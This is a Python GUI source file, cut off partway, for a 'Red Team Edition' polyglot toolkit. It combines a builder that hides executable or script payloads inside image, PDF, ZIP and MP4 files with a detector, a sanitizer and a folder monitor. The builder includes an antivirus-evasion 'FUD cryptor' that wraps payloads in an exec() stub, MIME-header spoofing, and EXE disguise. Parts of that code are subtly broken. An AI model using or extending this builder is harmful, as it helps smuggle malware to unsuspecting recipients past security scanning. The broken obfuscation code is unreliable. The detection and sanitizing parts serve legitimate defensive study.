#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  POLYGLOT TOOLKIT v2.0 — Red Team Edition                    ║
║  Builder + Detector + Sanitizer + Real-Time Monitor          ║
║  Author: Mr-DS-ML-85                                         ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, os, struct, math, hashlib, zlib, shutil, json, platform, subprocess, threading, time
from datetime import datetime
from pathlib import Path
from collections import deque
import base64, random, string

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QFrame, QStackedWidget, QFileDialog,
    QTextEdit, QLineEdit, QComboBox, QCheckBox, QProgressBar,
    QGroupBox, QGridLayout, QScrollArea, QSplitter, QMessageBox,
    QTabWidget, QSpinBox, QToolButton, QSizePolicy
)
from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal, QSize, QPropertyAnimation, QEasingCurve
from PyQt6.QtGui import QFont, QColor, QPalette, QIcon, QPainter, QLinearGradient, QBrush, QPixmap, QPen


# ── Cross-Platform Notifications ────────────────────────────

class Notifier:
    @staticmethod
    def send(title, message, urgency="normal"):
        system = platform.system()
        try:
            if system == "Linux":
                subprocess.run(["notify-send", "-u", urgency, "-a", "Polyglot Toolkit", title, message],
                             capture_output=True, timeout=5)
            elif system == "Darwin":
                script = f'display notification "{message}" with title "{title}"'
                subprocess.run(["osascript", "-e", script], capture_output=True, timeout=5)
            elif system == "Windows":
                # PowerShell toast notification
                ps = f'''
                [Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
                [Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
                $template = [Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
                $template.GetElementsByTagName("text")[0].AppendChild($template.CreateTextNode("{title}"))
                $template.GetElementsByTagName("text")[1].AppendChild($template.CreateTextNode("{message}"))
                $toast = [Windows.UI.Notifications.ToastNotification]::new($template)
                [Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Polyglot Toolkit").Show($toast)
                '''
                subprocess.run(["powershell", "-Command", ps], capture_output=True, timeout=10)
        except Exception:
            pass

    @staticmethod
    def play_alert():
        system = platform.system()
        try:
            if system == "Linux":
                subprocess.run(["paplay", "/usr/share/sounds/freedesktop/stereo/alarm-clock-elapsed.oga"],
                             capture_output=True, timeout=3)
            elif system == "Darwin":
                subprocess.run(["afplay", "/System/Library/Sounds/Glass.aiff"], capture_output=True, timeout=3)
            elif system == "Windows":
                import winsound
                winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
        except Exception:
            pass


# ── Theme Colors ─────────────────────────────────────────────

class Theme:
    BG_DARK      = "#0a0e14"
    BG_PANEL     = "#111822"
    BG_CARD      = "#1a2233"
    BG_INPUT     = "#0d1520"
    BG_HOVER     = "#1e2d44"
    FG_TEXT       = "#c5d0db"
    FG_DIM       = "#556677"
    FG_ACCENT    = "#ff3333"
    FG_ACCENT2   = "#ff6644"
    FG_GREEN     = "#22cc55"
    FG_YELLOW    = "#ddaa22"
    FG_BLUE      = "#3399ff"
    FG_PURPLE    = "#aa55ff"
    FG_CYAN      = "#22dddd"
    FG_ORANGE    = "#f0883e"
    BORDER       = "#1e2d3d"
    BORDER_LIGHT = "#2a3d55"


# ── Styled Widgets ───────────────────────────────────────────

def make_button(text, color=Theme.FG_ACCENT, bg=None):
    btn = QPushButton(text)
    bg = bg or color
    btn.setStyleSheet(f"""
        QPushButton {{
            background-color: {bg};
            color: white;
            border: none;
            border-radius: 6px;
            padding: 10px 24px;
            font-weight: bold;
            font-size: 13px;
        }}
        QPushButton:hover {{
            background-color: {color};
        }}
        QPushButton:pressed {{
            background-color: {Theme.BG_DARK};
        }}
    """)
    return btn

def make_card(title="", icon=""):
    frame = QFrame()
    frame.setStyleSheet(f"""
        QFrame {{
            background-color: {Theme.BG_CARD};
            border: 1px solid {Theme.BORDER};
            border-radius: 10px;
        }}
    """)
    layout = QVBoxLayout(frame)
    layout.setContentsMargins(18, 14, 18, 14)
    if title:
        lbl = QLabel(f"{icon}  {title}" if icon else title)
        lbl.setStyleSheet(f"color: {Theme.FG_BLUE}; font-size: 14px; font-weight: bold; border: none;")
        layout.addWidget(lbl)
    return frame, layout

def make_stat_card(icon, value, label, color):
    card = QFrame()
    card.setStyleSheet(f"""
        QFrame {{
            background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                stop:0 {Theme.BG_CARD}, stop:1 {Theme.BG_PANEL});
            border: 1px solid {Theme.BORDER};
            border-radius: 12px;
        }}
    """)
    layout = QVBoxLayout(card)
    layout.setAlignment(Qt.AlignmentFlag.AlignCenter)
    layout.setSpacing(4)

    icon_lbl = QLabel(icon)
    icon_lbl.setStyleSheet(f"font-size: 28px; border: none;")
    icon_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)

    val_lbl = QLabel(str(value))
    val_lbl.setStyleSheet(f"color: {color}; font-size: 32px; font-weight: bold; border: none; font-family: 'Consolas', monospace;")
    val_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)

    name_lbl = QLabel(label)
    name_lbl.setStyleSheet(f"color: {Theme.FG_DIM}; font-size: 11px; border: none; text-transform: uppercase; letter-spacing: 1px;")
    name_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)

    layout.addWidget(icon_lbl)
    layout.addWidget(val_lbl)
    layout.addWidget(name_lbl)
    card.val_label = val_lbl
    return card

def styled_input(placeholder="", mono=True):
    inp = QLineEdit()
    inp.setPlaceholderText(placeholder)
    font = "'Consolas', 'Courier New', monospace" if mono else "'Segoe UI', 'SF Pro', sans-serif"
    inp.setStyleSheet(f"""
        QLineEdit {{
            background-color: {Theme.BG_INPUT};
            color: {Theme.FG_TEXT};
            border: 1px solid {Theme.BORDER};
            border-radius: 6px;
            padding: 10px 14px;
            font-family: {font};
            font-size: 13px;
        }}
        QLineEdit:focus {{
            border: 1px solid {Theme.FG_ACCENT};
        }}
    """)
    return inp

def styled_combo(items):
    combo = QComboBox()
    combo.addItems(items)
    combo.setStyleSheet(f"""
        QComboBox {{
            background-color: {Theme.BG_INPUT};
            color: {Theme.FG_TEXT};
            border: 1px solid {Theme.BORDER};
            border-radius: 6px;
            padding: 10px 14px;
            font-size: 13px;
        }}
        QComboBox:hover {{
            border: 1px solid {Theme.FG_ACCENT};
        }}
        QComboBox::drop-down {{
            border: none;
            width: 30px;
        }}
        QComboBox QAbstractItemView {{
            background-color: {Theme.BG_CARD};
            color: {Theme.FG_TEXT};
            selection-background-color: {Theme.BG_HOVER};
            border: 1px solid {Theme.BORDER};
        }}
    """)
    return combo

def styled_log():
    log = QTextEdit()
    log.setReadOnly(True)
    log.setStyleSheet(f"""
        QTextEdit {{
            background-color: {Theme.BG_DARK};
            color: {Theme.FG_TEXT};
            border: 1px solid {Theme.BORDER};
            border-radius: 8px;
            padding: 12px;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 12px;
            selection-background-color: {Theme.FG_ACCENT};
        }}
    """)
    return log


# ── Polyglot Builder Engine ──────────────────────────────────

class PolyglotBuilder:
    """Builds polyglot files with advanced attack vectors."""

    def __init__(self):
        self.last_stats = {}

    def entropy(self, data: bytes) -> float:
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        length = len(data)
        return -sum((f / length) * math.log2(f / length) for f in freq if f > 0)

    def xor_crypt(self, data: bytes, key: bytes) -> bytes:
        """XOR encrypt/decrypt with repeating key."""
        key_expanded = (key * (len(data) // len(key) + 1))[:len(data)]
        return bytes(a ^ b for a, b in zip(data, key_expanded))

    def fud_obfuscate(self, payload: bytes) -> bytes:
        """FUD cryptor — multi-layer obfuscation to evade AV detection."""
        # Layer 1: Random XOR key prepended
        key = os.urandom(32)
        encrypted = self.xor_crypt(payload, key)

        # Layer 2: zlib compression
        compressed = zlib.compress(encrypted, 9)

        # Layer 3: Base64 encoding with random padding
        encoded = base64.b85encode(compressed)

        # Layer 4: Add junk data at random positions
        junk_count = random.randint(3, 8)
        result = bytearray(encoded)
        for _ in range(junk_count):
            pos = random.randint(0, len(result))
            junk = os.urandom(random.randint(4, 16))
            result[pos:pos] = junk

        # Wrap in a self-extracting stub
        stub = b'#!/usr/bin/env python3\n'
        stub += b'import base64,zlib,os,sys,struct\n'
        stub += f'k={key.hex()}\n'.encode()
        stub += b'd=base64.b85decode(zlib.decompress(base64.b85decode(b"' + base64.b85encode(compressed) + b'")))\n'
        stub += b'exec(compile(d,"<fud>","exec"))\n'

        return stub

    def mime_confusion(self, data: bytes, fake_ext: str) -> bytes:
        """MIME-type confusion — prepend fake headers for different file types."""
        headers = {
            '.jpg': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
            '.png': b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde',
            '.gif': b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00',
            '.pdf': b'%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n',
            '.mp4': b'\x00\x00\x00\x1cftypisom\x00\x00\x02\x00isomiso2',
            '.zip': b'PK\x03\x04\x14\x00\x00\x00\x00\x00',
            '.bmp': b'BM',
        }
        header = headers.get(fake_ext, b'')
        return header + data

    def build_jpeg(self, cover: bytes, payload: bytes) -> bytes:
        if cover[:2] != b'\xff\xd8':
            raise ValueError("Not a valid JPEG")
        eoi = cover.rfind(b'\xff\xd9')
        if eoi == -1:
            raise ValueError("JPEG EOI not found")
        return cover[:eoi + 2] + b'\xff\xfe' + struct.pack('<H', min(len(payload), 65533)) + payload

    def build_png(self, cover: bytes, payload: bytes) -> bytes:
        if cover[:8] != b'\x89PNG\r\n\x1a\n':
            raise ValueError("Not a valid PNG")
        iend = cover.rfind(b'IEND')
        if iend == -1:
            raise ValueError("IEND not found")
        return cover[:iend + 8] + payload

    def build_gif(self, cover: bytes, payload: bytes) -> bytes:
        if cover[:6] not in (b'GIF87a', b'GIF89a'):
            raise ValueError("Not a valid GIF")
        term = cover.rfind(b'\x3b')
        if term == -1:
            raise ValueError("GIF terminator not found")
        return cover[:term + 1] + b'\x00' * 16 + payload

    def build_pdf(self, cover: bytes, payload: bytes) -> bytes:
        if not cover.startswith(b'%PDF'):
            raise ValueError("Not a valid PDF")
        eof = cover.rfind(b'%%EOF')
        if eof == -1:
            raise ValueError("PDF %%EOF not found")
        return cover[:eof + 5] + b'\r\n%hidden\r\n' + payload

    def build_zip(self, cover: bytes, payload: bytes) -> bytes:
        if cover[:2] != b'PK':
            raise ValueError("Not a valid ZIP")
        eocd = cover.rfind(b'\x50\x4b\x05\x06')
        if eocd == -1:
            raise ValueError("ZIP EOCD not found")
        return cover[:eocd] + payload + cover[eocd:]

    def build_mp4(self, cover: bytes, payload: bytes) -> bytes:
        """MP4 polyglot — payload in free/moov atom or after last atom."""
        if not (b'ftyp' in cover[:20]):
            raise ValueError("Not a valid MP4/ISO file")
        # Append payload as a 'free' atom
        atom_header = struct.pack('>I', len(payload) + 8) + b'free'
        return cover + atom_header + payload

    def build_exe_icon_hack(self, exe_path: str, cover_path: str, output_path: str):
        """Replace EXE icon with cover file's icon to disguise it."""
        # Read the PE and extract/replace icon resource
        # For cross-platform: use a resource editor approach
        with open(exe_path, 'rb') as f:
            exe_data = bytearray(f.read())

        # Embed cover image data in PE overlay (after PE end)
        with open(cover_path, 'rb') as f:
            cover_data = f.read()

        # Add MIME header confusion + cover data at PE overlay
        result = bytes(exe_data) + b'\x00' * 256 + cover_data
        with open(output_path, 'wb') as f:
            f.write(result)
        return output_path

    def build(self, cover_path: str, payload_path: str, output_path: str,
              container_type: str = "jpeg", encrypt: bool = False,
              fud: bool = False, mime_confuse: bool = False) -> dict:

        with open(cover_path, 'rb') as f:
            cover = f.read()
        with open(payload_path, 'rb') as f:
            payload = f.read()

        original_payload = payload

        # FUD obfuscation
        if fud:
            payload = self.fud_obfuscate(payload)

        # XOR encryption
        key = None
        if encrypt:
            key = os.urandom(32)
            payload = self.xor_crypt(payload, key)

        # MIME confusion
        if mime_confuse:
            ext = os.path.splitext(cover_path)[1]
            payload = self.mime_confusion(payload, ext)

        builders = {
            'jpeg': self.build_jpeg, 'jpg': self.build_jpeg,
            'png': self.build_png, 'gif': self.build_gif,
            'pdf': self.build_pdf, 'zip': self.build_zip,
            'mp4': self.build_mp4,
        }

        builder = builders.get(container_type.lower())
        if not builder:
            raise ValueError(f"Unsupported container: {container_type}")

        polyglot = builder(cover, payload)

        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or '.', exist_ok=True)
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        self.last_stats = {
            'output': output_path,
            'container_type': container_type.upper(),
            'cover_size': len(cover),
            'payload_size': len(original_payload),
            'processed_size': len(payload),
            'output_size': len(polyglot),
            'payload_offset': len(polyglot) - len(payload),
            'encrypted': encrypt,
            'fud_protected': fud,
            'mime_confused': mime_confuse,
            'entropy': round(self.entropy(payload), 2),
        }
        return self.last_stats


# ── Detector Engine ──────────────────────────────────────────

class PolyglotDetector:
    def __init__(self):
        self.signatures = {
            'PE/EXE': b'MZ', 'ELF': b'\x7fELF', 'PDF': b'%PDF',
            'ZIP': b'PK', 'RAR': b'Rar!', '7Z': b'7z',
            'GZIP': b'\x1f\x8b', 'BAT': b'@echo', 'PS1': b'powershell',
            'SH': b'#!/bin/', 'CLASS': b'\xca\xfe\xba\xbe',
            'MACHO': b'\xfe\xed\xfa', 'LNK': b'\x4c\x00\x00\x00',
            'VBS': b'CreateObject', 'JSCRIPT': b'function(',
            'REG': b'Windows Registry', 'HTA': b'<hta:',
            'SCRIPT': b'<script', 'BASE64': b'base64',
            'CMD': b'cmd.exe', 'POWERSHELL': b'powershell',
        }

    def entropy(self, data: bytes) -> float:
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        length = len(data)
        return -sum((f / length) * math.log2(f / length) for f in freq if f > 0)

    def scan_file(self, filepath: str) -> list:
        findings = []
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
        except Exception as e:
            return [{'type': 'ERROR', 'detail': str(e), 'severity': 'error', 'offset': 0}]

        ext = os.path.splitext(filepath)[1].lower()
        content_type = None

        # Detect real content type
        sigs = {'.jpg': 'JPEG', '.jpeg': 'JPEG', '.png': 'PNG', '.gif': 'GIF', '.pdf': 'PDF', '.zip': 'ZIP', '.mp4': 'MP4'}
        if data[:2] == b'\xff\xd8': content_type = 'JPEG'
        elif data[:8] == b'\x89PNG\r\n\x1a\n': content_type = 'PNG'
        elif data[:6] in (b'GIF87a', b'GIF89a'): content_type = 'GIF'
        elif data[:4] == b'%PDF': content_type = 'PDF'
        elif data[:2] == b'PK': content_type = 'ZIP'
        elif b'ftyp' in data[:20]: content_type = 'MP4'
        elif data[:2] == b'MZ': content_type = 'PE'
        elif data[:4] == b'\x7fELF': content_type = 'ELF'

        # Extension vs content mismatch
        expected = sigs.get(ext)
        if expected and content_type and expected != content_type:
            findings.append({
                'type': 'EXTENSION_MISMATCH',
                'detail': f'Extension says {expected}, content is {content_type}',
                'severity': 'critical', 'offset': 0
            })

        # Hidden signatures (skip first 64 bytes)
        for name, sig in self.signatures.items():
            offset = data.find(sig, 64)
            if offset != -1:
                findings.append({
                    'type': 'HIDDEN_SIGNATURE',
                    'detail': f'{name} at 0x{offset:X}',
                    'severity': 'high' if name in ('PE/EXE', 'ELF', 'LNK') else 'warning',
                    'offset': offset
                })

        # Trailing data after end markers
        markers = {
            'JPEG': (b'\xff\xd9', 2), 'PNG': (b'IEND', 8),
            'GIF': (b'\x3b', 1), 'PDF': (b'%%EOF', 5),
        }
        if content_type in markers:
            marker, extra = markers[content_type]
            pos = data.rfind(marker)
            if pos != -1 and pos + extra < len(data):
                trailing = len(data) - pos - extra
                findings.append({
                    'type': 'TRAILING_DATA',
                    'detail': f'{trailing} bytes after {content_type} end marker — hidden payload',
                    'severity': 'critical', 'offset': pos + extra
                })

        # Entropy analysis (8 sections)
        section_size = max(len(data) // 8, 1)
        for i in range(8):
            section = data[i * section_size:(i + 1) * section_size]
            if len(section) < 100:
                continue
            ent = self.entropy(section)
            if ent > 7.5:
                findings.append({
                    'type': 'HIGH_ENTROPY',
                    'detail': f'Section {i+1}/8: entropy {ent:.2f} (encrypted/compressed)',
                    'severity': 'info', 'offset': i * section_size
                })

        # MIME confusion detection
        if data[:4] == b'%PDF' and data.find(b'MZ', 100) != -1:
            findings.append({
                'type': 'MIME_CONFUSION',
                'detail': 'PDF header with embedded PE — MIME confusion attack',
                'severity': 'critical', 'offset': data.find(b'MZ', 100)
            })
        if data[:2] == b'\xff\xd8' and data.find(b'PK', 100) != -1:
            findings.append({
                'type': 'MIME_CONFUSION',
                'detail': 'JPEG header with embedded ZIP — MIME confusion attack',
                'severity': 'critical', 'offset': data.find(b'PK', 100)
            })

        return findings


# ── Sanitizer Engine ─────────────────────────────────────────

class PolyglotSanitizer:
    def sanitize(self, filepath: str, create_backup: bool = True) -> dict:
        with open(filepath, 'rb') as f:
            data = f.read()

        original_size = len(data)
        ext = os.path.splitext(filepath)[1].lower()
        cleaned = None
        detected = None

        handlers = {
            ('.jpg', '.jpeg'): ('JPEG', b'\xff\xd9', 2),
            ('.png',): ('PNG', b'IEND', 8),
            ('.gif',): ('GIF', b'\x3b', 1),
            ('.pdf',): ('PDF', b'%%EOF', 5),
        }

        for exts, (name, marker, extra) in handlers.items():
            if ext in exts or data[:len(marker)] == marker[:2]:
                pos = data.rfind(marker)
                if pos != -1 and pos + extra < len(data):
                    cleaned = data[:pos + extra]
                    detected = name
                break

        if ext in ('.zip',) or data[:2] == b'PK':
            eocd = data.rfind(b'\x50\x4b\x05\x06')
            if eocd != -1:
                expected = eocd + 22
                if expected < len(data):
                    cleaned = data[:expected]
                    detected = 'ZIP'

        if cleaned is None or len(cleaned) >= original_size:
            return {'status': 'clean', 'detail': f'{detected or "Unknown"}: No trailing data',
                    'original_size': original_size, 'removed_bytes': 0}

        if create_backup:
            shutil.copy2(filepath, filepath + '.bak')

        with open(filepath, 'wb') as f:
            f.write(cleaned)

        removed = original_size - len(cleaned)
        return {
            'status': 'sanitized', 'detail': f'{detected}: Removed {removed:,} bytes',
            'original_size': original_size, 'cleaned_size': len(cleaned),
            'removed_bytes': removed, 'backup': filepath + '.bak' if create_backup else None,
        }


# ── File Monitor ─────────────────────────────────────────────

class FileMonitorThread(QThread):
    alert_signal = pyqtSignal(dict)
    stats_signal = pyqtSignal(dict)

    def __init__(self):
        super().__init__()
        self.watch_dir = None
        self.running = False
        self.file_hashes = {}
        self.stats = {'scanned': 0, 'threats': 0, 'clean': 0}
        self.detector = PolyglotDetector()

    def start_monitoring(self, directory):
        self.watch_dir = directory
        self.running = True
        self.start()

    def stop_monitoring(self):
        self.running = False

    def run(self):
        scan_exts = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.pdf', '.doc',
                     '.docx', '.zip', '.exe', '.dll', '.scr', '.bat', '.cmd',
                     '.ps1', '.vbs', '.js', '.hta', '.lnk', '.elf', '.so', '.mp4'}

        while self.running:
            try:
                for root, dirs, files in os.walk(self.watch_dir):
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    for fname in files:
                        if not self.running:
                            return
                        ext = os.path.splitext(fname)[1].lower()
                        if ext not in scan_exts:
                            continue
                        fpath = os.path.join(root, fname)
                        try:
                            stat = os.stat(fpath)
                            current = (stat.st_mtime, stat.st_size)
                        except OSError:
                            continue

                        prev = self.file_hashes.get(fpath)
                        if prev is None or prev != current:
                            self.file_hashes[fpath] = current
                            self._scan(fpath)
                time.sleep(2)
            except Exception:
                time.sleep(5)

    def _scan(self, filepath):
        findings = self.detector.scan_file(filepath)
        self.stats['scanned'] += 1

        if findings:
            crit = [f for f in findings if f['severity'] in ('critical', 'high')]
            if crit:
                self.stats['threats'] += 1
                alert = {
                    'time': datetime.now().strftime('%H:%M:%S'),
                    'file': os.path.basename(filepath),
                    'path': filepath,
                    'severity': 'critical' if any(f['severity'] == 'critical' for f in crit) else 'high',
                    'detail': '; '.join(f['detail'] for f in crit[:3]),
                    'findings': findings,
                }
                self.alert_signal.emit(alert)
                Notifier.send(f"THREAT: {os.path.basename(filepath)}",
                            alert['detail'][:200], "critical")
            else:
                self.stats['clean'] += 1
        else:
            self.stats['clean'] += 1

        self.stats_signal.emit(self.stats.copy())


# ── Main Application ─────────────────────────────────────────

class PolyglotApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("◆ Polyglot Toolkit — Red Team Edition")
        self.setMinimumSize(1200, 750)
        self.resize(1300, 800)

        self.builder = PolyglotBuilder()
        self.detector = PolyglotDetector()
        self.sanitizer = PolyglotSanitizer()
        self.monitor_thread = FileMonitorThread()
        self.monitor_thread.alert_signal.connect(self._on_monitor_alert)
        self.monitor_thread.stats_signal.connect(self._on_monitor_stats)

        self.counts = {'scanned': 0, 'threats': 0, 'sanitized': 0, 'built': 0}

        self._apply_theme()
        self._build_ui()

    def _apply_theme(self):
        self.setStyleSheet(f"""
            QMainWindow {{ background-color: {Theme.BG_DARK}; }}
            QWidget {{ background-color: {Theme.BG_DARK}; color: {Theme.FG_TEXT}; font-family: 'Segoe UI', 'SF Pro Display', sans-serif; }}
            QScrollBar:vertical {{
                background: {Theme.BG_PANEL};
                width: 10px;
                border-radius: 5px;
            }}
            QScrollBar::handle:vertical {{
                background: {Theme.BORDER};
                border-radius: 5px;
                min-height: 30px;
            }}
            QScrollBar::handle:vertical:hover {{ background: {Theme.FG_DIM}; }}
            QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {{ height: 0; }}
            QCheckBox {{ spacing: 8px; font-size: 13px; }}
            QCheckBox::indicator {{
                width: 18px; height: 18px;
                border: 2px solid {Theme.BORDER};
                border-radius: 4px;
                background: {Theme.BG_INPUT};
            }}
            QCheckBox::indicator:checked {{
                background: {Theme.FG_ACCENT};
                border: 2px solid {Theme.FG_ACCENT};
            }}
            QProgressBar {{
                background: {Theme.BG_PANEL};
                border: none;
                border-radius: 4px;
                height: 8px;
                text-align: center;
            }}
            QProgressBar::chunk {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {Theme.FG_ACCENT}, stop:1 {Theme.FG_ACCENT2});
                border-radius: 4px;
            }}
        """)

    def _build_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QHBoxLayout(central)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        # Sidebar
        sidebar = QFrame()
        sidebar.setFixedWidth(220)
        sidebar.setStyleSheet(f"""
            QFrame {{
                background-color: {Theme.BG_PANEL};
                border-right: 1px solid {Theme.BORDER};
            }}
        """)
        sidebar_layout = QVBoxLayout(sidebar)
        sidebar_layout.setContentsMargins(0, 0, 0, 0)
        sidebar_layout.setSpacing(0)

        # Logo
        logo_frame = QFrame()
        logo_frame.setStyleSheet(f"background: {Theme.BG_DARK}; border: none; padding: 20px;")
        logo_layout = QVBoxLayout(logo_frame)
        logo_lbl = QLabel("◆ POLYGLOT")
        logo_lbl.setStyleSheet(f"color: {Theme.FG_ACCENT}; font-size: 20px; font-weight: bold; font-family: 'Consolas', monospace; border: none;")
        logo_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        sub_lbl = QLabel("RED TEAM EDITION")
        sub_lbl.setStyleSheet(f"color: {Theme.FG_DIM}; font-size: 10px; letter-spacing: 3px; border: none;")
        sub_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        logo_layout.addWidget(logo_lbl)
        logo_layout.addWidget(sub_lbl)
        sidebar_layout.addWidget(logo_frame)

        # Separator
        sep = QFrame()
        sep.setFixedHeight(1)
        sep.setStyleSheet(f"background: {Theme.BORDER};")
        sidebar_layout.addWidget(sep)

        # Nav buttons
        self.nav_buttons = []
        nav_items = [
            ("◈", "Dashboard", 0),
            ("◆", "Builder", 1),
            ("⚠", "Detector", 2),
            ("🛡", "Sanitizer", 3),
            ("▶", "Monitor", 4),
            ("📋", "Log", 5),
        ]

        for icon, label, idx in nav_items:
            btn = QPushButton(f"  {icon}   {label}")
            btn.setCursor(Qt.CursorShape.PointingHandCursor)
            btn.setStyleSheet(self._nav_style(False))
            btn.clicked.connect(lambda checked, i=idx, b=btn: self._switch_tab(i, b))
            sidebar_layout.addWidget(btn)
            self.nav_buttons.append(btn)

        sidebar_layout.addStretch()

        # Version
        ver = QLabel("  v2.0 — Mr-DS-ML-85")
        ver.setStyleSheet(f"color: {Theme.FG_DIM}; font-size: 10px; padding: 10px; border: none;")
        sidebar_layout.addWidget(ver)

        main_layout.addWidget(sidebar)

        # Content stack
        self.stack = QStackedWidget()
        self.stack.setStyleSheet(f"background: {Theme.BG_DARK};")

        self.stack.addWidget(self._build_dashboard())
        self.stack.addWidget(self._build_builder())
        self.stack.addWidget(self._build_detector())
        self.stack.addWidget(self._build_sanitizer())
        self.stack.addWidget(self._build_monitor())
        self.stack.addWidget(self._build_log())

        main_layout.addWidget(self.stack)

        # Default selection
        self._switch_tab(0, self.nav_buttons[0])

    def _nav_style(self, active):
        if active:
            return f"""
                QPushButton {{
                    background: {Theme.BG_CARD};
                    color: {Theme.FG_ACCENT};
                    border: none;
                    border-left: 3px solid {Theme.FG_ACCENT};
                    padding: 14px 20px;
                    text-align: left;
                    font-size: 14px;
                    font-weight: bold;
                }}
            """
        return f"""
            QPushButton {{
                background: transparent;
                color: {Theme.FG_DIM};
                border: none;
                border-left: 3px solid transparent;
                padding: 14px 20px;
                text-align: left;
                font-size: 14px;
            }}
            QPushButton:hover {{
                background: {Theme.BG_CARD};
                color: {Theme.FG_TEXT};
            }}
        """

    def _switch_tab(self, idx, btn):
        self.stack.setCurrentIndex(idx)
        for b in self.nav_buttons:
            b.setStyleSheet(self._nav_style(False))
        btn.setStyleSheet(self._nav_style(True))

    # ── Dashboard ────────────────────────────────────────────

    def _build_dashboard(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(30, 25, 30, 25)
        layout.setSpacing(20)

        # Header
        header = QLabel("Dashboard")
        header.setStyleSheet(f"font-size: 28px; font-weight: bold; color: {Theme.FG_TEXT};")
        layout.addWidget(header)

        # Stats row
        stats_row = QHBoxLayout()
        stats_row.setSpacing(15)

        self.stat_scanned = make_stat_card("🔍", "0", "Files Scanned", Theme.FG_BLUE)
        self.stat_threats = make_stat_card("⚠", "0", "Threats Found", Theme.FG_ACCENT)
        self.stat_sanitized = make_stat_card("🛡", "0", "Files Sanitized", Theme.FG_GREEN)
        self.stat_built = make_stat_card("◆", "0", "Polyglots Built", Theme.FG_ORANGE)

        for card in [self.stat_scanned, self.stat_threats, self.stat_sanitized, self.stat_built]:
            stats_row.addWidget(card)

        layout.addLayout(stats_row)

        # Recent alerts + quick actions
        bottom = QHBoxLayout()
        bottom.setSpacing(15)

        # Alerts
        alerts_card, alerts_layout = make_card("Recent Alerts", "🔔")
        self.dash_alerts = styled_log()
        self.dash_alerts.setMaximumHeight(300)
        alerts_layout.addWidget(self.dash_alerts)
        bottom.addWidget(alerts_card, stretch=2)

        # Quick actions
        actions_card, actions_layout = make_card("Quick Actions", "⚡")
        actions_layout.addSpacing(10)

        for text, callback in [
            ("⚡  Quick Scan File", self._quick_scan),
            ("🛡  Quick Sanitize", self._quick_sanitize),
            ("◆  Build Polyglot", lambda: self._switch_tab(1, self.nav_buttons[1])),
            ("▶  Start Monitor", lambda: self._switch_tab(4, self.nav_buttons[4])),
        ]:
            btn = make_button(text, Theme.FG_ACCENT if "Scan" in text else Theme.FG_GREEN if "San" in text else Theme.FG_BLUE)
            btn.setCursor(Qt.CursorShape.PointingHandCursor)
            btn.clicked.connect(callback)
            actions_layout.addWidget(btn)

        actions_layout.addStretch()
        bottom.addWidget(actions_card, stretch=1)

        layout.addLayout(bottom)
        return page

    # ── Builder ──────────────────────────────────────────────

    def _build_builder(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setContentsMargins(30, 25, 30, 25)
        layout.setSpacing(15)

        header = QLabel("◆  Polyglot Builder")
        header.setStyleSheet(f"font-size: 24px; font-weight: bold; color: {Theme.FG_ACCENT};")
        layout.addWidget(header)

        # Input section
        input_card, input_layout = make_card("Input Files", "📁")

        # Cover
        row = QHBoxLayout()
        row.addWidget(QLabel("Cover File:"))
        self.bld_cover = styled_input("Select cover file (JPEG, PNG, GIF, PDF, ZIP, MP4)...")
        row.addWidget(self.bld_cover, stretch=1)
        btn = make_button("Browse", Theme.FG_DIM)
        btn.clicked.connect(lambda: self._browse_file(self.bld_cover))
        row.addWidget(btn)
        input_layout.addLayout(row)

        # Payload
        row = QHBoxLayout()
        row.addWidget(QLabel("Payload:"))
        self.bld_payload = styled_input("Select payload file (EXE, BAT, VBS, script, archive)...")
        row.addWidget(self.bld_payload, stretch=1)
        btn = make_button("Browse", Theme.FG_DIM)
        btn.clicked.connect(lambda: self._browse_file(self.bld_payload))
        row.addWidget(btn)
        input_layout.addLayout(row)

        layout.addWidget(input_card)

        # Options
        opts_card, opts_layout = make_card("Attack Options", "⚙")

        grid = QGridLayout()
        grid.setSpacing(12)

        grid.addWidget(QLabel("Container Type:"), 0, 0)
        self.bld_type = styled_combo(['JPEG', 'PNG', 'GIF', 'PDF', 'ZIP', 'MP4'])
        grid.addWidget(self.bld_type, 0, 1)

